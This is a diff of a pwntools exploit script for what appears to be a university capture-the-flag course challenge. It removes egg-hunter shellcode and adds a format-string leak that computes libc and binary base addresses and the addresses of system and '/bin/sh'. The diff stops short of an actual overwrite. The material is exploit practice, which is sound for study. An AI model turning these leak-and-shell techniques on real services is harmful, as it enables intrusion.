@@ -6,11 +6,11 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 context.update(arch='i386')
-exe = './find-me' #Change this
+exe = './crypto3' #Change this
 
 PROGNAME = exe
 REMOTE = "comp6447.wtf" #Change this
-REMOTEPORT = 24973 #Change this
+REMOTEPORT = 10997 #Change this
 global p
 global e
 global global_timeout
@@ -47,54 +47,42 @@ else:
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
-# The first four instructions are equivalent to 0x4f904790.
-# This is our egg.
+def create(bytes):
+    p.recvuntil(b"refresh): ", drop=True)
+    p.sendline(b'c')
+    p.recvuntil(b"255): ", drop=True)
+    p.sendline(bytes)
 
-# Egg hunter
-small_assembly = """
-_start:
-mov edx, 0x4f904790
-loop:
-inc eax
-cmp dword ptr [eax], edx
-jne loop
-jmp eax
-"""
+def list():
+    p.recvuntil(b"): ", drop=True)
+    p.sendline(b'l')
 
-# Egg + Shellcode
-large_assembly = """
-nop
-inc edi
-nop
-dec edi
+def delete():
+    p.recvuntil(b"): ", drop=True)
+    p.sendline(b'd')
 
-xor ecx, ecx
-mul ecx
+# Buffer starts at 12th argument of %x
 
-sub esp, 400
-mov ecx, esp
-mov ebx, 1000
-mov eax, 0x3
-mov edx, 0xFF
-int 0x80
+payload = b'aaaa' + b'%x '*0x10
+create(payload)
+list()
+p.recvuntil(b"aaaa", drop=True)
+leaks = p.recvline()
+p.recvline()
+log.info(f"leaks @ {leaks}")
+# This is also the GOT??
+libc_base = leaks[27:35]
+libc_base = int(libc_base, 16)
+libc_base = libc_base - 0x1D8000
+log.info(f"libc base @ {hex(libc_base)}")
+# This is actually the GOT
+binary_base = leaks[36:44]
+binary_base = int(binary_base, 16)
+binary_base = binary_base - 0x4000
+log.info(f"binary base @ {hex(binary_base)}")
 
-mov eax, 0x4
-mov ebx, 0x1
-int 0x80
-
-mov eax, 0x1
-int 0x80
-"""
-
-
-
-small_asm = asm(small_assembly)
-large_asm = asm(large_assembly)
-
-p.recvuntil(b'smallbuf shellcode', drop=True)
-p.sendline(small_asm)
-p.recvuntil(b'bigbuf shellcode:', drop=True)
-p.sendline(large_asm)
+libc_system = libc_base + 0x03d200
+libc_binsh = libc_base + 0x17e0cf
 
 p.interactive()
 
